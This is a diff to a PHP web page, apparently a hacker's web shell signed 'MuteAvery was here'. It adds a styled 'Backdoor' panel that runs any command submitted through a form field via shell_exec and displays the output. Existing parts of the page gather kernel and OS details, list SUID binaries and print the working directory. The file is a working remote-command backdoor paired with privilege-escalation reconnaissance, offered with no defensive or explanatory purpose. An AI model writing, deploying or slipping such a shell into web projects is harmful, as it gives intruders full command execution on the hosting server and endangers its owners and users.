@@ -1,4 +1,49 @@
 <!-- MuteAvery was here <:~ -->
+<style>
+@keyframes retroScroll {
+    0% { background-position: 0 0; }
+    100% { background-position: 0 4px; }
+}
+
+@keyframes retroGlow {
+    0%,100% { box-shadow: 0 0 6px #22ff55 inset; }
+    50%      { box-shadow: 0 0 12px #22ff55 inset; }
+}
+
+.retro-terminal {
+    margin-top: 15px;
+    border: 2px solid #22ff55;
+    background: #000;
+    border-radius: 6px;
+    overflow: hidden;
+    background-image:
+        linear-gradient(rgba(0,255,70,0.05) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,70,0.02) 1px, transparent 1px);
+    background-size: 100% 3px, 3px 100%;
+    animation:
+        retroScroll 0.4s linear infinite,
+        retroGlow 3s ease-in-out infinite;
+}
+
+.retro-terminal-header {
+    background: #22ff55;
+    color: #000;
+    padding: 6px 10px;
+    font-family: Consolas, monospace;
+    font-weight: bold;
+    border-bottom: 2px solid #22ff55;
+}
+
+.retro-terminal-body {
+    padding: 10px;
+    color: #22ff55;
+    font-family: Consolas, monospace;
+    text-shadow: 0 0 5px #22ff55;
+    white-space: pre-wrap;
+}
+</style>
+
+
 <?php
 echo '<body style="background-color:#424242;">';
 ?>
@@ -13,9 +58,26 @@ echo '<body style="background-color:#424242;">';
 <input type= "text" name="command" />
 <input type="submit" value="Run"/><p>
 
+
+<?php if (!empty($_POST['command'])): ?>
+    <div class="retro-terminal">
+        <div class="retro-terminal-header">Backdoor</div>
+        <div class="retro-terminal-body">
+            <?php echo shell_exec($_POST['command']); ?>
+        </div>
+    </div>
+<?php endif; ?>
+
+
+
+
+
+
+<br><br>
 <b>System Info:</b><p>
 ------------------------------------------------------------------------------------------------------------
 
+<br><br>
 <b>Kernel & OS Info</b>
 <?php
 $uname = shell_exec("uname -a;  awk -F= '/^(PRETTY_NAME|BUILD_ID)=/ { gsub(/\"/, \"\", \$2); print \$1\": \"\$2 }' /etc/os-release");
@@ -70,7 +132,7 @@ echo "<pre>$SUIDS</pre>";
 
 <?php
 $pwd = shell_exec("pwd");
-echo "<1pre>$pwd</pre>";
+echo "<pre>$pwd</pre>";
 ?>
 
 </form></fieldset>
